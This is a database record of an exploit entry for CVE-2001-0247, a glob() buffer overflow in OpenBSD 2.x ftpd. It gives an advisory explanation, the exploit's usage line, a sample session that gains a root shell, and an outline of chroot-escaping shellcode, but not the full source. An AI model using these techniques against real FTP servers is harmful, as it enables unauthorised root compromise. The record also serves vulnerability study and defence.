{
    "text": "ecve : CVE-2001-0247 ， title : OpenBSD 2.x < 2.8 FTPd - 'glob (  ) ' Remote Buffer Overflow - OpenBSD remote Exploit ， verified : Verified ， exploit_detail : // source :  ， The BSD ftp daemon and derivatives ( such as IRIX ftpd or the ftp daemon shipped with Kerberos 5 ) contain a number of buffer overflows that may lead to a compromise of root access to malicious users. ， During parsing operations , the ftp daemon assumes that there can never be more than 512 bytes of user-supplied data. This is because that is usually how much data is read from a socket. Because of this assumption , certain memory copy operations involving user data lack bounds checking. ， It is possible for users to use metacharacters to expand file/path names through interpretation by glob (  ) and exploit these overflowable conditions. In order to do so , the attacker's ftp account must be able to either create directories or directories with long enough names must exist already. ， Any attacker to successfully exploit this vulnerability would gain root access on the target host. ， / *  ， OpenBSD 2.x - 2.8 ftpd exploit. ， It is possible to exploit an anonymous ftp without write permission ， under certain circumstances. One is most likely to succeed if there ， is a single directory somewhere with more than 16 characters in its ， name. ， Of course , if one has write permissions , one could easily create ， such a directory. ， My return values aren't that good. Find your own. ， Patch is available at ， Example :  ， ftp> pwd ， 257 \"/test\" is current directory. ， ftp> dir ， 229 Entering Extended Passive Mode (  | 12574 |  )  ， 150 Opening ASCII mode data connection for '/bin/ls'. ， total 2 ， drwxr-xr-x 2 1000 0 512 Apr 14 14 : 14 12345678901234567 ， 226 Transfer complete. ，  $ ./leheehel -c /test -l 17 -s0xdfbeb970 localhost ， // 230 Guest login ok , access restrictions apply. ， // 250 CWD command successful. ， retaddr = dfbeb970 ， Press enter.. ， remember to remove the \"adfa\"-dir ， id ， uid=0 ( root ) gid=32766 ( nogroup ) groups=32766 ( nogroup )  ， The shellcode basically does :  ， seteuid ( 0 )  ; a = open ( \"..\" , O_RDONLY )  ; mkdir ( \"adfa\" , 555 )  ;  ， chroot ( \"adfa\" )  ; fchdir ( a )  ; for ( cnt = 100 ; cnt ; cnt- )  ， chdir ( \"..\" )  ;  ， chroot ( \"..\" )  ; execve ( \"/bin//sh\" , .. )  ; ",
    "time": "2001-04-16"
}